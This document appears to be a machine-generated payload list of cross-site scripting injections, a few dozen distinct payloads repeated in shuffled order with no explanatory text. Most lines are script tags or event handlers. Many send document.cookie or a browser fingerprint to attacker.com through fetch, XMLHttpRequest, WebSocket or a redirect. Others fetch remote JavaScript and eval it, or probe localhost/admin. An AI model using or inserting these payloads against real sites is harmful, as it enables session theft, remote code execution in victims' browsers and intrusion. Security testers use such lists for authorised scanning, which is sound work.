<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<svg onload="alert(1)"></svg>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<svg onload="alert(1)"></svg>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<svg onload="alert(1)"></svg>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<svg onload="alert(1)"></svg>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<svg onload="alert(1)"></svg>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<svg onload="alert(1)"></svg>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<div style="background-image: url('javascript:alert(1)')"></div>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
